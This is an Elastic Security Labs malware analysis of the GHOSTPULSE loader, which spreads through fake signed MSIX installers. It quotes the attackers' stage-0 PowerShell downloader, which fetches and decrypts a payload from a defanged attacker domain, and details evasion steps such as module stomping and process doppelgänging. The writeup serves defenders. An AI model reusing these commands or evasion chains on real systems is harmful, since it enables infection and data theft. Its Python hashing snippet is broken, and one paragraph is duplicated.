{
  "attributes": {
    "raw": {
      "document": "---\ntitle: \"GHOSTPULSE haunts victims using defense evasion bag o' tricks\"\nslug: \"ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks\"\ndate: \"2023-10-27\"\ndescription: \"Elastic Security Labs reveals details of a new campaign leveraging defense evasion capabilities to infect victims with malicious MSIX executables.\"\nauthor:\n  - slug: salim-bitam\n  - slug: joe-desimone\nimage: \"photo-edited-05@2x.jpg\"\ncategory:\n  - slug: attack-pattern\n  - slug: malware-analysis\ntags:\n  - ghostpulse\n  - ref8207\n---\n\n## Update\n\nIn October 2024, we released an update to stage 2 of GHOSTPULSE that includes new evasion techniques. You can check it out [here](https://www.elastic.co/security-labs/tricks-and-treats).\n\n## Preamble\n\nElastic Security Labs has observed a campaign to compromise users with signed [MSIX](https://learn.microsoft.com/en-us/windows/msix/overview) application packages to gain initial access. The campaign leverages a stealthy loader we call GHOSTPULSE which decrypts and injects its final payload to evade detection.\n\nMSIX is a Windows app package format that developers can leverage to package, distribute, and install their applications to Windows users. With [App Installer](https://learn.microsoft.com/en-us/windows/msix/app-installer/app-installer-root), MSIX packages can be installed with a double click. This makes them a potential target for adversaries looking to compromise unsuspecting victims. However, MSIX requires access to purchased or stolen code signing certificates making them viable to groups of above-average resources.\n\nIn a common attack scenario, we suspect the users are directed to download malicious MSIX packages through [compromised websites](https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates), search-engine optimization (SEO) techniques, or malvertising. The masquerading themes we’ve observed include installers for Chrome, Brave, Edge, Grammarly, and WebEx to highlight a few.\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image5.png)\n\nFrom the user's perspective, the “Install” button appears to function as intended. No pop-ups or warnings are presented. However, a PowerShell script is covertly used to download, decrypt, and execute GHOSTPULSE on the system. \n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image10.jpg)\n\n## Malware Analysis\n\nThe GHOSTPULSE loader can be broken down into 3 stages (sometimes preceded by a PowerShell script) used to execute a final payload.\n\n### Stage 0\n\nWe consider the PowerShell script dropped by the malicious MSIX installer to be the stage 0 payload. The PowerShell script is typically included in MSIX infection vectors, but not always in other GHOSTPULSE infection methods (MSI, EXE, ISO). In one sample, the PowerShell script downloads a GPG-encrypted file from `manojsinghnegi[.]com/2.tar.gpg`. \n\nNext, the PowerShell script decrypts the file using the command-line GPG utility using the following parameters:\n\n- `putin` - the passphrase for the GPG file\n- `--batch` - execute GPG in non-interactive mode\n- `--yes` - answer “yes” to any prompts\n- `--passphrase-fd 0` - read the passphrase from a file descriptor, 0 instructs GPG to use STDIN, which is putin\n- `--decrypt` - decrypt a file\n- `--output` - what to save the decrypted file as\n\n```\n# 1\n$url = \"https://manojsinghnegi[.]com/2.tar.gpg\"\n$outputPath = \"$env:APPDATA\\$xxx.gpg\"\nInvoke-WebRequest -Uri $url -OutFile $outputPath\n\n# 1\necho 'putin' | .$env:APPDATA\\gpg.exe --batch --yes --passphrase-fd 0 --decrypt --output $env:APPDATA\\$xxx.rar $env:APPDATA\\$xxx.gpg\n```\n\nThe GPG utility is included in the malicious MSIX installer package.\n\nThe decrypted file is a tar archive containing an executable `VBoxSVC.exe` which is in reality a renamed signed `gup.exe` executable that is used to update Notepad++, which is vulnerable to sideloading, an encrypted file in one example `handoff.wav` and a mostly benign library `libcurl.dll` with one of its functions overwritten with malicious code. The PowerShell executes the binary `VBoxSVC.exe` that will side load from the current directory the malicious DLL `libcurl.dll`. By minimizing the on-disk footprint of encrypted malicious code, the threat actor is able to evade file-based AV and ML scanning.\n\n![File metadata of VBoxSVC.bin](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image11.png)\n\n### Stage 1\n\nThe first stage of GHOSTPULSE is embedded within a malicious DLL that undergoes side-loading through a benign executable. Execution of the corresponding code is triggered during the *DllEntryPoint* phase. \n\nThe process is initiated by pinpointing the base address of the malicious DLL of `libcurl.dll`, achieved through parsing the *InLoadOrderModuleList* API. This list, residing in the Process Environment Block (PEB), systematically records information about loaded modules.\n\n![Parsing the InLoadOrderModuleList structure](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image13.png)\n\nNext, GHOSTPULSE builds an Import Address Table (IAT) incorporating essential APIs. This operation involves parsing the *InLoadOrderModuleList* structure within the Process Environment Block (PEB).\n\n![Stage 1 hashing algorithm](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image13.png)\n\n``` python\n# Python code used for API hashing\ndef calculate_api_name_hash(api_name):\n    value = 0\n    for char in input_string:\n        total = (ord(char) + value *0x1003F)&0xFFFFFFFF\n    return value \n```\n        \nBelow is the Stage 1 IAT structure reconstructed from the GHOSTPULSE malware sample, provided for reference:\n\n``` c\nstruct core_stage1_IAT\n{\nvoid *kernel32_LoadLibraryW;\nvoid *kernel32_QueryPerformanceCounter;\nvoid *ntdll_module;\nvoid *kernel32_CloseHandle;\n__int64 field_20;\n__int64 field_28;\n__int64 field_30;\n__int64 field_38;\nvoid *kernel32_GetTempPathW;\nvoid *kernel32_GetModuleFileNameW;\n__int64 field_50;\n__int64 field_58;\n__int64 field_60;\nvoid *ntdll__swprintf;\n__int64 field_70;\n__int64 field_78;\n__int64 (__fastcall *ntdll_RtlDecompressBuffer)(__int64, __int64, _QWORD, __int64, int, int *);\nvoid *kernel32_CreateFileW;\nvoid *kernel32_ReadFile;\nvoid *ntdll_NtQueryInformationProcess;\nvoid *kernel32_GetFileSize;\n__int64 field_A8;\nvoid *kernel32_module;\n__int64 field_B8;\nvoid *ntdll_NtDelayExecution;\n__int64 (__fastcall *kernel32_GlobalAlloc)(__int64, __int64);\n__int64 field_D0;\nvoid *kernel32_GlobalFree;\n__int64 field_E0;\nvoid *ntdll_RtlQueryEnvironmentVariable_U;\n};\n```\n\nIt then proceeds with its operation by reading and parsing the file named `handoff.wav` from the current directory. This file contains an encrypted data blob divided into distinct chunks. Each chunk of data is positioned following the string IDAT. The parsing process involves the malware executing through two distinct steps.\n\n![Reading and decrypting the encrypted file](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image14.png)\n\nThe initial phase involves identifying the commencement of the encrypted data by searching for the IDAT string in the file, which is followed by a distinctive 4-byte tag value. If the tag corresponds to the value stored in the malware's configuration, the malware extracts the bytes of the encrypted blob. The initial structure is as follows:\n\n``` c\nstruct initial_idat_chunk\n{\n  DWORD size_of_chunk;\n  DWORD IDAT_string;\n  DWORD tag;\n  DWORD xor_key;\n  DWORD size_of_encrypted_blob;\n  _BYTE first_chunk[];\n};\n```\n    \n- **size_of_chunk**: The malware utilizes this value, performing bits shifting to determine the chunk size to extract before the next occurrence of IDAT. \n- **xor_key**: A 4-byte long XOR key employed for decrypting the consolidated encrypted blob after extraction\n- **size_of_encrypted_blob**: Denotes the overall size of the encrypted blob, which is stored in chunks within the file \n- **first_chunk**: Marks the start of the first chunk of data in memory\n \n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image2.png)\n\nIn the second step, the malware locates the next occurrence of IDAT and proceeds to extract the encrypted chunks that follow it which has the following format: \n\n``` c\nstruct next_idat_chunk\n{\nDWORD size_of_chunk;\nDWORD IDAT_string;\n_BYTE n_chunk[];\n};\n```\n\n- **size_of_chunk**: The malware utilizes this value, performing bits shifting to determine the chunk size to extract before the next occurrence of IDAT. \n- **n_chunk**: Marks the start of the chunk of data in memory\n\nThe malware continues extracting encrypted data chunks until it reaches the specified size_of_encrypted_blob. Subsequently, the malware proceeds to decrypt the data using the 4-byte XOR key *xor_key*.\n\nAt this stage, the data blob, which is already compressed, undergoes decompression by the malware. The decompression process utilizes the `RtlDecompressBuffer` api.\n\n![Decompression using the RtlDecompressBuffer API](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image1.png)\n \nThe malware proceeds by loading a specified library stored in its configuration, in this case, `mshtml.dll`, utilizing the *LoadLibraryW* function. Shellcode (Stage 2) contained inside the decrypted and decompressed blob of data is written to the .text section of the freshly loaded DLL and then executed.\n\nThis technique is known as “module stomping”. The following image shows the associated *VirtualProtect* API calls captured with [Elastic Defend](https://www.elastic.co/guide/en/security/current/install-endpoint.html) associated with the module stomping:\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image4.png)\n \n### Stage 2\n\nStage 2 initiates by constructing a new IAT structure and utilizing the CRC32 algorithm as the API name hashing mechanism.\nThe following is the IAT structure of stage 2:\n\n``` c\nstruct core_stage2_IAT\n{\n  void *kernel32_module;\n  void *ntdll_module;\n  void *kernel32_CreateFileW;\n  void *kernel32_WriteFile;\n  void *kernel32_ReadFile;\n  void *kernel32_SetFilePointer;\n  void *kernel32_CloseHandle;\n  void *kernel32_GlobalAlloc;\n  void *kernel32_GlobalFree;\n  void *kernel32_ExpandEnvironmentStringsW;\n  void *kernel32_GetFileSize;\n  void *kernel32_GetProcAddress;\n  void *kernel32_LoadLibraryW;\n  void *ntdll__swprintf;\n  void *kernel32_QueryPerformanceCounter;\n  void *ntdll_RtlDecompressBuffer;\n  void *field_80;\n  void *field_88;\n  void *field_90;\n  void *field_98;\n  void *field_A0;\n  void *ntdll_NtDelayExecution;\n  void *ntdll_RtlRandom;\n  void *kernel32_GetModuleFileNameW;\n  void *kernel32_GetCommandLineW;\n  void *field_C8;\n  void *ntdll_sscanf;\n  void *field_D8;\n  void *ntdll_NtQueryInformationProcess;\n  void *ntdll_NtQuerySystemInformation;\n  void *kernel32_CreateDirectoryW;\n  void *kernel32_CopyFileW;\n  void *ntdll_NtClose;\n  void *field_108;\n  void *field_110;\n  void *field_118;\n  void *field_120;\n  void *field_128;\n  void *kernel32_SetCurrentDirectoryW;\n  void *field_138;\n  void *kernel32_SetEnvironmentVariableW;\n  void *kernel32_CreateProcessW;\n  void *kernel32_GetFileAttributesW;\n  void *msvcrt_malloc;\n  void *msvcrt_realloc;\n  void *msvcrt_free;\n  void *ntdll_RtlHashUnicodeString;\n  void *field_178;\n  void *field_180;\n  void *kernel32_OpenMutexA;\n  void *field_190;\n  void *kernel32_VirtualProtect;\n  void *kernel32_FlushInstructionCache;\n  void *field_1A8;\n  void *ntdll_NtOpenProcessToken;\n  void *ntdll_NtQueryInformationToken;\n  void *ntdll_RtlWalkFrameChain;\n  void *field_1C8;\n  void *addr_temp_file_content;\n  void *addr_decrypted_file;\n};\n```\n\nConcerning NT functions, the malware reads the ntdll.dll library from disk and writes it to a dynamically allocated memory space with read, write, and execute permissions. Subsequently, it parses the loaded `ntdll.dll` library to extract the offsets of the required NT functions. These offsets are then stored within the newly built IAT structure. When the malware necessitates the execution of an NT API, it adds the API offset to the base address of `ntdll.dll` and directly invokes the API. Given that NT APIs operate at a very low level, they execute syscalls directly, which does not require the `ntdll.dll` library to be loaded in memory using the LoadLibrary API, this is done to evade userland hooks set by security products.\n\nThe following is the structure used by the malware to store NT API offsets:\n\n``` c\nstruct __unaligned __declspec(align(4)) core_stage2_nt_offsets_table\n{\n  __int64 ntdll_module;\n  int ZwCreateSection;\n  int ZwMapViewOfSection;\n  int ZwWriteVirtualMemory;\n  int ZwProtectVirtualMemory;\n  int NtSuspendThread;\n  int ZwResumeThread;\n  int ZwOpenProcess;\n  int ZwGetContextThread;\n  int NtSetContextThread;\n};\n```\n\nGHOSTPULSE has the ability to establish persistence, if configured to, by generating an `.lnk` file that points to the Stage 1 binary, denoted as `VBoxSVC.exe`. To achieve this, the malware leverages COM (Component Object Model) objects as part of its technique.\n\n![Persistence executed according to the configuration flag](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image6.png)\n \nIt extracts another sub-blob of data from the first decrypted blob of Stage 1. This data is located at a specific position in the structure. The malware then performs an XOR encryption on this sub-blob, using the result of the XOR operation between the CRC32 value of the machine's computer name and the constant value `0xA1B2D3B4`. Finally, the encrypted data is saved to a file in the user's temporary folder.\nIt extracts another sub-blob of data from the first decrypted blob of Stage 1. This data is located at a specific position in the structure. The malware then performs an XOR encryption on this sub-blob, using the result of the XOR operation between the CRC32 value of the machine's computer name and the constant value `0xA1B2D3B4`. Finally, the encrypted data is saved to a file in the user's temporary folder.\n\nThe malware then initiates a suspended child process using the executable specified in the Stage 2 configuration, which is a 32-bit `cmd.exe` in this case. It then adds an environment variable to the child process with a random name, example: `GFHZNIOWWLVYTESHRTGAVC`, pointing to the previously created temporary file. \n\nFurther, the malware proceeds by creating a section object and mapping a view of it to `mshtml.dll` in the child process using the `ZwCreateSection` and `ZwMapViewOfSection` APIs.\n\nThe legitimate `mshtml.dll` code is overwritten with the *WriteProcessMemory* API. The primary thread’s execution is then redirected to the malicious code in `mshtml.dll` with the *Wow64SetThreadContext* API as shown in the following image:\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image12.png)\n \nThe parent process promptly terminates itself.\n\n### Stage 3\n\nThe objective of GHOSTPULSE’s Stage 3 is to load and execute the final payload in another  process. One interesting part of Stage 3 was that it overwrites its previously executed instructions with new instructions to make analysis difficult. It is also capable of establishing persistence using the same method described above. GHOSTPULSE executes NTDLL APIs using the \"[heaven’s gate](https://www.zdnet.com/article/malware-authors-are-still-abusing-the-heavens-gate-technique/)\" technique.\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image9.png)\n\nStage 3 starts off by constructing its own Function Import Table using CRC32 as the hashing algorithm. Additionally, it has the capability to disable redirection of the file system to WOW64, achieved through the utilization of the procedure `Wow64FsRedirection`, if configured to do so.\n\nFollowing this, Stage 3 accesses the environment variable that was set earlier, in our case `GFHZNIOWWLVYTESHRTGAVC`, retrieves the associated temporary file and proceeds to decrypt its contents.\n\n![Decrypting the temp file using the computer name and a hardcoded value](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image15.png)\n\nThe decrypted file includes both a configuration and the ultimate payload in an encrypted format. The final payload undergoes XOR decryption using a 200-byte long key stored within the configuration. The malware then parses the PE structure of the payload with a set of functions that will indicate how the payload will be injected, for example, the type of payload (DLL or executable) architecture, etc.\n\n![Decrypting the final payload](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image3.png)\n\nGHOSTPULSE employs [Process Doppelgänging](https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack), leveraging the NTFS transactions feature to inject the final payload into a new child process. The following steps illustrate the process:\n\n- Calls the `CreateTransaction` API to initial a transaction\n- Creates a transaction file with a random file name in temp folder with the `ZwCreateFile` API\n- Writes the payload to the temp file using the `ZwWriteFile` API\n- Creates a section of the transaction file with `ZwCreateSection` API\n- At this point the file is not needed anymore, the malware calls the `RollbackTransaction` API to roll the transaction back\n- GHOSTPULSE creates a suspended process with the target process path taken from it's configuration, in our sample `1msbuild.exe1`\n- It maps a view of the section to the process with the `ZwMapViewOfSection` API\n- It sets the child process thread instruction pointer to the entry point of the final payload with the `NtSetContextThread` API\n- Finally it resumes the thread with the `NtResumeThread` API\n\n![Functions used to execute process doppelgänging technique](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image8.png)\n\n### Final Payload\n\nThe final payload varies from sample to sample but is typically an information stealer. We have observed SectopRAT, Rhadamanthys, Vidar, Lumma, and NetSupport as final payloads. In SectopRAT samples, the malware first reaches out to Pastebin to retrieve the command and control address. In this case, it was `195.201.198[.]179` over TCP port `15647` as shown below:\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image7.jpg)\n\n## Configuration extractor\n\nAlongside this research, the Elastic Security Research Team has provided a [configuration extractor](https://github.com/elastic/labs-releases/blob/main/tools/ghostpulse/ghostpulse_payload_extractor.py) to allow threat researchers to continue work to discover further developments within this campaign and expand detection capabilities for our community. The extractor takes the encrypted file shipped with GHOSTPULSE as the input.\n\n![](/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image16.png)\n\n## Detection Guidance\n\nElastic Defend detects this threat with the following [behavior protection rules](https://github.com/elastic/protections-artifacts/tree/main/behavior):\n\n- DNS Query to Suspicious Top Level Domain\n- Library Load of a File Written by a Signed Binary Proxy\n- Suspicious API Call from an Unsigned DLL\n- Suspicious Memory Write to a Remote Process\n- Process Creation from Modified NTDLL\n\nThe following yara rule will also detect GHOSTPULSE loaders on disk:\n\n- [Windows.Trojan.GhostPulse](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_GhostPulse.yar)\n\n## Observations\n \nAll observables are also available for [download](https://github.com/elastic/labs-releases/tree/main/indicators/ghostpulse) in both ECS and STIX format.\n\nThe following observables were discussed in this research.\n\n| Observable                                                       | Type        | Name            | Reference                   |\n|------------------------------------------------------------------|-------------|-----------------|-----------------------------|\n| 78.24.180[.]93                                                   | ip-v4       |                 | Stage 0 C2 IP               |\n| manojsinghnegi[.]com                                             | domain-name |                 | Stage 0 C2 domain           |\n| manojsinghnegi[.]com/2.tar.gpg                                   | url         |                 | Stage 0 C2 URL              |\n| 0c01324555494c35c6bbd8babd09527bfc49a2599946f3540bb3380d7bec7a20 | sha256      | Chrome-x64.msix | Malicious MSIX              |\n| ee4c788dd4a173241b60d4830db128206dcfb68e79c68796627c6d6355c1d1b8 | sha256      | Brave-x64.msix  | Malicious MSIX              |\n| 4283563324c083f243cf9335662ecc9f1ae102d619302c79095240f969d9d356 | sha256      | Webex.msix      | Malicious MSIX              |\n| eb2addefd7538cbd6c8eb42b70cafe82ff2a8210e885537cd94d410937681c61 | sha256      | new1109.ps1     | PowerShell Downloader       |\n| 49e6a11453786ef9e396a9b84aeb8632f395477abc38f1862e44427982e8c7a9 | sha256      | 38190626900.rar | GHOSTPULSE tar archive      |\n| Futurity Designs Ltd                                             | Code signer |                 | Chrome-x64.msix code signer |\n| Fodere Titanium Limited                                          | Code signer |                 | Brave-x64.msix code signer  |\n| IMPERIOUS TECHNOLOGIES LIMITED                                   | Code signer |                 | Webex.msix code signer      |\n\n## References\n\n- [https://twitter.com/1ZRR4H/status/1699923793077055821](https://twitter.com/1ZRR4H/status/1699923793077055821)\n- [https://www.rapid7.com/blog/post/2023/08/31/fake-update-utilizes-new-idat-loader-to-execute-stealc-and-lumma-infostealers/](https://www.rapid7.com/blog/post/2023/08/31/fake-update-utilizes-new-idat-loader-to-execute-stealc-and-lumma-infostealers/)\n- [https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates](https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates)\n"
    },
    "title": "GHOSTPULSE haunts victims using defense evasion bag o' tricks",
    "slug": "ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks",
    "date": "2023-10-27",
    "description": "Elastic Security Labs reveals details of a new campaign leveraging defense evasion capabilities to infect victims with malicious MSIX executables.",
    "author": [
      {
        "slug": "salim-bitam"
      },
      {
        "slug": "joe-desimone"
      }
    ],
    "image": "photo-edited-05@2x.jpg",
    "category": [
      {
        "slug": "attack-pattern"
      },
      {
        "slug": "malware-analysis"
      }
    ],
    "tags": [
      "ghostpulse",
      "ref8207"
    ]
  },
  "id": "security_labs_content-ghostpulse_haunts_victims_using_defense_evasion_bag_o_tricks-md",
  "type": "security_labs_content"
}
